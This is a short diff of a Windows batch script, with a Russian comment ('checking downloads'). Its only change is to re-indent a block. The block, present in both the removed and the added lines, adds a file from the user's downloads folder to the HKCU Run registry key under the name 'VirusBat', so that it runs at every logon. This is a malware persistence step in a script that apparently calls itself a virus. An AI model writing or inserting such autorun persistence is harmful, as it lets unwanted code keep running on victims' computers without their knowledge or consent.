@@ -16,10 +16,10 @@ if %errorlevel% == 0 (
         goto :end
     )
 
-:: (Проверяем загрузки)
-if exist "%downloads%\%filename%" (
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%downloads%\%filename%" /f
-)
+    :: (Проверяем загрузки)
+    if exist "%downloads%\%filename%" (
+        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%downloads%\%filename%" /f
+    )
 
 :end
 
